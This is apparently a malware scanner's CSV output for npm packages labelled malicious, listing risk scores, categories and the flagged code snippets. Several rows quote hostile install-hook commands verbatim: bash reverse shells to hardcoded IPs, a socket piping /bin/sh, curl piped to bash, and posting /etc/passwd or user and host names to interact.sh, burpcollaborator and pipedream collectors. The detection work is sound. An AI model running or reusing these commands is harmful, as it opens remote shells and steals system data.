package_name,version,label,timestamp,routing,risk_score,confidence,primary_category,confirmed_count,supporting_count,noise_filtered,layer1_count,layer2_count,sources_analyzed,has_js_source,confirmed_signals_json,supporting_signals_json
azure-sp,3.0.0,malicious,2026-03-27T01:53:55.140620,flag,1.0,0.7383,network_exfiltration,3,3,0,2,4,"index.js,entry_point",True,"[""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const http = require(\""http\"");"", ""Signal  : Hardcoded external IP(s) in function call: 54.188.234.198\nLocation: index.js:7\nCode    : exec('curl http://ident.me', (error, stdout, stderr) => {     const trackingData = JSON.stringify({         hd: os.homedir(),         hn: os..."", ""Signal  : Hardcoded external IP(s) in function call: 54.188.234.198\nLocation: entry_point:7\nCode    : exec('curl http://ident.me', (error, stdout, stderr) => {     const trackingData = JSON.stringify({         hd: os.homedir(),         hn: os...""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:9\nCode    : hd: os.homedir(),"", ""Signal  : Non-standard URL in function call: http://ident.me\nLocation: index.js:7\nCode    : exec('curl http://ident.me', (error, stdout, stderr) => {     const trackingData = JSON.stringify({         hd: os.homedir(),         hn: os..."", ""Signal  : Non-standard URL in function call: http://ident.me\nLocation: entry_point:7\nCode    : exec('curl http://ident.me', (error, stdout, stderr) => {     const trackingData = JSON.stringify({         hd: os.homedir(),         hn: os...""]"
azurefilter,99.10.11,malicious,2026-03-27T01:53:55.191541,review,0.494,0.715,network_exfiltration,1,1,0,2,0,"index.js,entry_point",True,"[""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:164\nCode    : hd: os.homedir(),""]"
babel-preset-geocaching,1.0.0,malicious,2026-03-27T01:53:55.196054,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
backdoor119,10.0.0,malicious,2026-03-27T01:53:55.203635,flag,0.9973,0.865,data_exfiltration,2,0,0,2,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:21\nCode    : hostname: \""eozoqlc5vryvzzr.m.pipedream.net\"","", ""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]",[]
@immersive-composer/backend-resources,10.0.0,malicious,2026-03-27T01:53:55.204183,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
bazel-out,999.9.9,malicious,2026-03-27T01:53:55.210232,flag,0.7373,0.79,network_exfiltration,2,0,0,2,0,s.js,True,"[""Signal  : Network Request In Install\nLocation: s.js:1\nCode    : var e,n=require(\""os\""),o=n.hostname(),r=n.userInfo().username,s=n.platform();if(\""win32\""==s||\""win64\""==s){try{net_session=r..."", ""Signal  : Version contains inflated segment(s) [999] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 999.9.9""]",[]
bb-builder,1.0.6,malicious,2026-03-27T01:53:55.213406,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
bc-image-loader,9.849.3,malicious,2026-03-27T01:53:55.258742,review,0.494,0.715,network_exfiltration,1,1,1,2,1,"build.js,entry_point",True,"[""Signal  : Network Request In Install\nLocation: build.js:1\nCode    : var http = require(\""https\"");""]","[""Signal  : Version contains inflated segment(s) [849] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 9.849.3""]"
@cuda-networks/bds-core,0.9.0,malicious,2026-03-27T01:53:55.262264,review,0.364,0.78,network_exfiltration,1,0,0,1,0,"index.js,entry_point",True,"[""Signal  : Network Request In Install\nLocation: index.js:1\nCode    : const https = require('https');""]",[]
beaker-virtual-fs,4.0.0,malicious,2026-03-27T01:53:55.262766,skip,0.0,,none,0,0,0,0,0,none,False,[],[]
bebekair,1.7.0,malicious,2026-03-27T01:53:55.274793,flag,1.0,0.85,network_exfiltration,4,0,2,0,6,"index.js,entry_point",True,"[""Signal  : Hardcoded external IP(s) in function call: 8.8.8.8\nLocation: index.js:73\nCode    : dns.lookup(ns, function(err, address) {     if (!err) {         nsAddress = address;     } else {         nsAddress = '8.8.8.8';     }     d..."", ""Signal  : Hardcoded external IP(s) in function call: 8.8.4.4\nLocation: index.js:73\nCode    : dns.lookup(ns, function(err, address) {     if (!err) {         nsAddress = address;     } else {         nsAddress = '8.8.8.8';     }     d..."", ""Signal  : Hardcoded external IP(s) in function call: 8.8.8.8\nLocation: entry_point:73\nCode    : dns.lookup(ns, function(err, address) {     if (!err) {         nsAddress = address;     } else {         nsAddress = '8.8.8.8';     }     d..."", ""Signal  : Hardcoded external IP(s) in function call: 8.8.4.4\nLocation: entry_point:73\nCode    : dns.lookup(ns, function(err, address) {     if (!err) {         nsAddress = address;     } else {         nsAddress = '8.8.8.8';     }     d...""]",[]
bem-mvc-direct,1.11.3,malicious,2026-03-27T01:53:55.275579,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
bem-mvc-direct,1.11.4,malicious,2026-03-27T01:53:55.276332,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
bemhint-plugins,0.5.12,malicious,2026-03-27T01:53:55.277047,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
bemhint.i18n,0.2.6,malicious,2026-03-27T01:53:55.277770,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
bemmy,137.0.0,malicious,2026-03-27T01:53:55.296770,flag,1.0,0.9,obfuscation,3,0,0,0,3,"dns.js,index.js,entry_point",True,"[""Signal  : Obfuscator tool signature (_0x pattern, 27 occurrences)\nLocation: dns.js:4\nCode    : var _0xf9a0=['\\x64\\x6E\\x73','\\x6F\\x73','','\\x63\\x68\\x61\\x72\\x43\\x6F\\x64\\x65\\x41\\x74','\\x6D\\x61\\x70','\\x73\\x70\\x6C\\x69\\x7"", ""Signal  : Obfuscator tool signature (_0x pattern, 20 occurrences)\nLocation: index.js:6\nCode    : var _0xee82=['\\x68\\x74\\x74\\x70\\x73','\\x2E','\\x6A\\x6F\\x69\\x6E','\\x37\\x36\\x63\\x34\\x32\\x66\\x32\\x37\\x64\\x32\\x36\\x30\\x39\\x31\\"", ""Signal  : Obfuscator tool signature (_0x pattern, 20 occurrences)\nLocation: entry_point:6\nCode    : var _0xee82=['\\x68\\x74\\x74\\x70\\x73','\\x2E','\\x6A\\x6F\\x69\\x6E','\\x37\\x36\\x63\\x34\\x32\\x66\\x32\\x37\\x64\\x32\\x36\\x30\\x39\\x31\\""]",[]
bemmy-slider,141.0.0,malicious,2026-03-27T01:53:55.319629,flag,0.84,0.9,obfuscation,2,0,0,0,2,"index.js,entry_point",True,"[""Signal  : Obfuscator tool signature (_0x pattern, 20 occurrences)\nLocation: index.js:10\nCode    : var _0xee82=['\\x68\\x74\\x74\\x70\\x73','\\x2E','\\x6A\\x6F\\x69\\x6E','\\x37\\x36\\x63\\x34\\x32\\x66\\x32\\x37\\x64\\x32\\x36\\x30\\x39\\x31\\"", ""Signal  : Obfuscator tool signature (_0x pattern, 20 occurrences)\nLocation: entry_point:10\nCode    : var _0xee82=['\\x68\\x74\\x74\\x70\\x73','\\x2E','\\x6A\\x6F\\x69\\x6E','\\x37\\x36\\x63\\x34\\x32\\x66\\x32\\x37\\x64\\x32\\x36\\x30\\x39\\x31\\""]",[]
@tide-web-apps/bert2,3.2.0,malicious,2026-03-27T01:53:55.322262,flag,1.0,0.95,data_exfiltration,2,0,0,2,0,entry_point,True,"[""Signal  : Known webhook/exfiltration collector domain in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : ping $USER.$HOST.lpetgyzx2ghe7bqjh666m2b0trzin7.burpcollaborator.net "", ""Signal  : Known webhook/exfiltration collector domain in install hook\nLocation: package.json \u2192 scripts.postinstall\nCode    : ping post.$USER.$HOST.lpetgyzx2ghe7bqjh666m2b0trzin7.burpcollaborator.net ""]",[]
bfs-hello-world,98.10.11,malicious,2026-03-27T01:53:55.347927,review,0.3967,0.85,dynamic_code_execution,1,0,0,1,0,"index.js,entry_point",True,"[""Signal  : Eval In Install File\nLocation: index.js:14\nCode    : eval(hexify(package,hexify(package,image)));""]",[]
bfx-hf-func-data,94.10.9,malicious,2026-03-27T01:53:55.370238,skip,0.0,,none,0,0,2,0,2,"index.js,entry_point",True,[],[]
bi3g0-npm-test,1.0.1,malicious,2026-03-27T01:53:55.387651,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:26\nCode    : hostname: \""eucturjgaxgeyaaowd534x5a117svh.burpcollaborator.net\"", //replace burpcollaborator.net with Interactsh or piped"", ""Signal  : Network Request In Install\nLocation: index.js:5\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:12\nCode    : hd: os.homedir(),""]"
big-design,2.0.0,malicious,2026-03-27T01:53:55.398161,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:25\nCode    : hostname: \""cd5wt1g2vtc00000aj7ggg16pyayyyyyb.oast.fun\"", //replace burpcollaborator.net with Interactsh or pipedream"", ""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:11\nCode    : hd: os.homedir(),""]"
binary-bot,5.3.2,malicious,2026-03-27T01:53:55.407035,review,0.494,0.715,network_exfiltration,1,1,0,2,0,"index.js,entry_point",True,"[""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:12\nCode    : hd: os.homedir(),""]"
bitbank-api-docs,1.0.0,malicious,2026-03-27T01:53:55.415747,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:25\nCode    : hostname: \""burpcollaborator.net\"", //replace burpcollaborator.net with Interactsh or pipedream"", ""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:11\nCode    : hd: os.homedir(),""]"
bitcoisnj-lib,1.1.2,malicious,2026-03-27T01:53:55.421454,skip,0.0,,none,0,0,0,0,0,"package.js,entry_point",True,[],[]
bitmovin-internal,0.0.2,malicious,2026-03-27T01:53:55.430279,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:25\nCode    : hostname: \""bfbbc33ec3cf29a6e3ba9d029249b343.m.pipedream.net\"", //replace burpcollaborator.net with Interactsh or pipedrea"", ""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:11\nCode    : hd: os.homedir(),""]"
bitshares-ui-style-guide,1.0.1,malicious,2026-03-27T01:53:55.439025,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:25\nCode    : hostname: \""eon4ohhg8790gtf.m.pipedream.net\"","", ""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:11\nCode    : hd: os.homedir(),""]"
bjabaiheiiyuuui,5.0.0,malicious,2026-03-27T01:53:55.447735,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:25\nCode    : hostname: \""ccjjr4r2vtc0000ta0ggggjk9uayyyyyr.oast.fun\"", //replace burpcollaborator.net with Interactsh or pipedream"", ""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:11\nCode    : hd: os.homedir(),""]"
bleeding-edge-css,2.2.2,malicious,2026-03-27T01:53:55.453001,flag,1.0,0.835,network_exfiltration,4,0,2,0,6,"index.js,entry_point",True,"[""Signal  : Hardcoded external IP(s) in function call: 193.105.207.70\nLocation: index.js:6\nCode    : client.connect(9001, \""193.105.207.70\"", function(){         client.pipe(sh.stdin);         sh.stdout.pipe(client);         sh.stderr.pipe(cli..."", ""Signal  : child_process.spawn() with dynamic argument\nLocation: index.js:4\nCode    : cp.spawn(\""/bin/sh\"", [])"", ""Signal  : Hardcoded external IP(s) in function call: 193.105.207.70\nLocation: entry_point:6\nCode    : client.connect(9001, \""193.105.207.70\"", function(){         client.pipe(sh.stdin);         sh.stdout.pipe(client);         sh.stderr.pipe(cli..."", ""Signal  : child_process.spawn() with dynamic argument\nLocation: entry_point:4\nCode    : cp.spawn(\""/bin/sh\"", [])""]",[]
bluebird.node,1.1.1,malicious,2026-03-27T01:53:55.453726,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
bluebird.node,1.3.4,malicious,2026-03-27T01:53:55.455007,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
bluehost-wordpress-plugin,1.0.0,malicious,2026-03-27T01:53:55.455527,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 2 file(s): ['package.json', 'pre.sh']""]",[]
blz-internal-pkg,2.0.0,malicious,2026-03-27T01:53:55.456124,flag,0.9693,0.835,data_exfiltration,2,0,0,2,0,none,False,"[""Signal  : Known webhook/exfiltration collector domain in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : /usr/bin/curl --data '@/etc/passwd' $(hostname).c76vh7298mig6so43dmgc8g9t8oyyyyyn.interact.sh"", ""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
buffer-fetch,1.0.2,malicious,2026-03-27T01:53:55.994343,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
buffer-fetch,1.0.3,malicious,2026-03-27T01:53:56.458903,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
buffer-polyfill,9.9.3,malicious,2026-03-27T01:53:56.463598,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
buildin,99.99.2,malicious,2026-03-27T01:53:56.472827,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:25\nCode    : hostname: \""eoqu05c9wd0uxgg.m.pipedream.net\"", //replace burpcollaborator.net with Interactsh or pipedream"", ""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:11\nCode    : homedirectory: os.homedir(),""]"
bundled-deps-poc,1.0.0,malicious,2026-03-27T01:53:56.473546,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
by-gtm,1.0.0,malicious,2026-03-27T01:53:56.482433,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:25\nCode    : hostname: \""cegk7jy2vtc00003q290g8eju3cyyyyyb.oast.fun\"", //replace burpcollaborator.net with Interactsh or pipedream"", ""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:11\nCode    : hd: os.homedir(),""]"
by-skynet,1.0.0,malicious,2026-03-27T01:53:56.486914,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
byte5432,1.0.3,malicious,2026-03-27T01:53:56.487595,flag,1.0,0.9633,backdoor_installation,3,0,0,3,0,none,False,"[""Signal  : Reverse Shell Tcp in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : bash -c 'bash -i >& /dev/tcp/121.43.55.52/2333 0>&1'"", ""Signal  : Interactive Reverse Shell in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : bash -c 'bash -i >& /dev/tcp/121.43.55.52/2333 0>&1'"", ""Signal  : Hardcoded external IP address '121.43.55.52'\nLocation: package.json \u2192 scripts.preinstall\nCode    : bash -c 'bash -i >& /dev/tcp/121.43.55.52/2333 0>&1'""]",[]
bytectffe1w0d,0.0.1,malicious,2026-03-27T01:53:56.488631,flag,1.0,0.9633,backdoor_installation,3,0,0,3,0,entry_point,True,"[""Signal  : Reverse Shell Tcp in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : bash -i >& /dev/tcp/121.4.243.54/22224 0>&1"", ""Signal  : Interactive Reverse Shell in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : bash -i >& /dev/tcp/121.4.243.54/22224 0>&1"", ""Signal  : Hardcoded external IP address '121.4.243.54'\nLocation: package.json \u2192 scripts.preinstall\nCode    : bash -i >& /dev/tcp/121.4.243.54/22224 0>&1""]",[]
cage-js,0.0.4,malicious,2026-03-27T01:53:56.489311,flag,1.0,0.8033,remote_code_execution,3,0,0,3,0,none,False,"[""Signal  : Remote Shell Download in install hook\nLocation: package.json \u2192 scripts.postinstall\nCode    : curl https://files.gangelov.net/cage.sh 2>/dev/null | bash &>/dev/null"", ""Signal  : Curl External Url in install hook\nLocation: package.json \u2192 scripts.postinstall\nCode    : curl https://files.gangelov.net/cage.sh 2>/dev/null | bash &>/dev/null"", ""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 2 file(s): ['README.md', 'package.json']""]",[]
cal_rd,0.1.1,malicious,2026-03-27T01:53:56.492232,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
calc_testing,2.0.0,malicious,2026-03-27T01:53:56.527317,review,0.3967,0.85,dynamic_code_execution,1,0,0,1,0,"index.js,entry_point",True,"[""Signal  : Eval In Install File\nLocation: index.js:1\nCode    : eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10...""]",[]
cameo-react-native-share-story,2.9.0,malicious,2026-03-27T01:53:56.531960,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
cameo-react-native-share-story,2.9.1,malicious,2026-03-27T01:53:56.536519,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
chalc,2.0.0,malicious,2026-03-27T01:53:56.541208,flag,0.77,0.825,typosquatting,2,0,1,1,2,entry_point,True,"[""Signal  : Package name closely resembles popular package 'chalk'\nLocation: package.json \u2192 name\nCode    : 'chalc' vs 'chalk' (edit_distance=1, ratio=0.20)"", ""Signal  : Hardcoded external IP(s) in function call: 23.94.46.191\nLocation: entry_point:4\nCode    : http.get({ \t\thost: '23.94.46.191', \t\tport: 80, \t\tpath: '/update.json' \t}, function(response) { \t\tvar body = ''; \t\tresponse.on('data', functi...""]",[]
chalk2,2.4.0,malicious,2026-03-27T01:53:56.562986,review,0.3873,0.83,typosquatting,1,0,0,1,0,entry_point,True,"[""Signal  : Package name closely resembles popular package 'chalk'\nLocation: package.json \u2192 name\nCode    : 'chalk2' vs 'chalk' (edit_distance=1, ratio=0.17)""]",[]
chameleonbasic,1.0.4-test.1,malicious,2026-03-27T01:53:56.567830,skip,0.0,,none,0,0,0,0,0,"./index.js,entry_point",True,[],[]
changelog-tool,1.1.0,malicious,2026-03-27T01:53:56.568551,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
changelog-tool,1.1.1,malicious,2026-03-27T01:53:56.569244,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
charset-normalizer,10.10.1,malicious,2026-03-27T01:53:56.578103,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:25\nCode    : hostname: \""cdas7cn2vtc0000ryjeggg4idqryyyyyu.oast.fun\"", //replace burpcollaborator.net with Interactsh or pipedream"", ""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:11\nCode    : hd: os.homedir(),""]"
chart.js-latest,1.0.0,malicious,2026-03-27T01:53:56.578641,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 2 file(s): ['package.json', 'pre.sh']""]",[]
citrix-translate,2.610.0,malicious,2026-03-27T01:53:56.603722,review,0.494,0.715,network_exfiltration,1,1,1,2,1,"build.js,entry_point",True,"[""Signal  : Network Request In Install\nLocation: build.js:1\nCode    : var http = require('https');""]","[""Signal  : Version contains inflated segment(s) [610] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 2.610.0""]"
clarity-atoms,1.1.2,malicious,2026-03-27T01:53:56.604390,flag,0.9693,0.835,data_exfiltration,2,0,0,2,0,none,False,"[""Signal  : Known webhook/exfiltration collector domain in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : echo test | dig `xxd -p /etc/hostname`.k4patrwflxsxghdt6a9g2yoei5owcl.burpcollaborator.net"", ""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@lightdash/cli,0.130.2,malicious,2026-03-27T01:53:56.604982,skip,0.0,,none,0,0,0,0,0,none,False,[],[]
com.google,0.0.0,malicious,2026-03-27T01:53:56.606229,flag,0.7773,0.835,data_exfiltration,2,0,0,2,0,entry_point,True,"[""Signal  : Known webhook/exfiltration collector domain in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : export HOSTNAME && BCNET=\""linux-com.google-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\""; pin"", ""Signal  : Curl External Url in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : export HOSTNAME && BCNET=\""linux-com.google-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\""; pin""]",[]
com.google.play,1.0.0,malicious,2026-03-27T01:53:56.607447,flag,0.7773,0.835,data_exfiltration,2,0,0,2,0,entry_point,True,"[""Signal  : Known webhook/exfiltration collector domain in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : export HOSTNAME && BCNET=\""linux-com.google.play-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\"""", ""Signal  : Curl External Url in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : export HOSTNAME && BCNET=\""linux-com.google.play-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\""""]",[]
com.unity.ai.navigation.components,1.0.6,malicious,2026-03-27T01:53:56.608030,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
com.unity.ai.navigation.components,1.1.1-exp.2,malicious,2026-03-27T01:53:56.608522,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
commander-js,2.19.84,malicious,2026-03-27T01:53:56.719587,flag,0.7933,0.85,local_code_execution,2,0,2,1,3,"setup.js,entry_point",True,"[""Signal  : Child Process Exec\nLocation: setup.js:1\nCode    : (function(){ require('child_process').spawn('BUILD_ID=.temp-build nohup node update.js >/dev/null 2>&1 &', { stdio: 'inh..."", ""Signal  : child_process.spawn() with dynamic argument\nLocation: setup.js:1\nCode    : require('child_process').spawn('BUILD_ID=.temp-build nohup node update.js >/dev/null 2>&1 &', { stdio: 'inherit', shell: true })""]",[]
commerce-clients,999.9.9,malicious,2026-03-27T01:53:56.723474,flag,0.77,0.825,dynamic_code_execution,2,0,0,2,0,"install.js,entry_point",True,"[""Signal  : Eval In Install File\nLocation: install.js:1\nCode    : const e=require(\""crypto\""),r=\""aes-256-ctr\"",t=String.fromCharCode(86)+\""kYp3s6v9y$B&E)H@MbQeThWmZq4t7w!\"",o=o=>{const c=e.cr..."", ""Signal  : Version contains inflated segment(s) [999] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 999.9.9""]",[]
commerce-sdk-react,2.4.1-dev,malicious,2026-03-27T01:53:56.732087,review,0.39,0.65,none,0,3,0,1,2,"index.js,entry_point",True,[],"[""Signal  : Filesystem Write In Install\nLocation: index.js:34\nCode    : fs.writeFile('ByKotko.txt', 'this proof for report', function (err) {"", ""Signal  : Non-standard URL in function call: https://kotko.org/?${company}:${packages}=${buff}\nLocation: index.js:41\nCode    : request(`https://kotko.org/?${company}:${packages}=${buff}`, (error, response, body) => {})"", ""Signal  : Non-standard URL in function call: https://kotko.org/?${company}:${packages}=${buff}\nLocation: entry_point:41\nCode    : request(`https://kotko.org/?${company}:${packages}=${buff}`, (error, response, body) => {})""]"
common-web-frontend-styling,9.9.9,malicious,2026-03-27T01:53:56.736435,review,0.364,0.78,network_exfiltration,1,0,0,1,0,./.pbk.js,True,"[""Signal  : Network Request In Install\nLocation: ./.pbk.js:2\nCode    : const https = require('https');""]",[]
common-web-frontend-styling,9.99.999,malicious,2026-03-27T01:53:56.740774,review,0.494,0.715,network_exfiltration,1,1,0,2,0,./.pbk.js,True,"[""Signal  : Network Request In Install\nLocation: ./.pbk.js:2\nCode    : const https = require('https');""]","[""Signal  : Version contains inflated segment(s) [999] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 9.99.999""]"
compositionupdate,88.8.8,malicious,2026-03-27T01:53:56.749728,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:25\nCode    : hostname: \""oiaqaquemkde49kzmhr5ot4uhlnbb0.burpcollaborator.net\"", //replace burpcollaborator.net with Interactsh or piped"", ""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:11\nCode    : hd: os.homedir(),""]"
conflicting_modules,1.0.0,malicious,2026-03-27T01:53:56.758600,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:25\nCode    : hostname: \""ztw2mbassru9btmbquidmgnxyo4es3.burpcollaborator.net\"","", ""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:11\nCode    : hd: os.homedir(),""]"
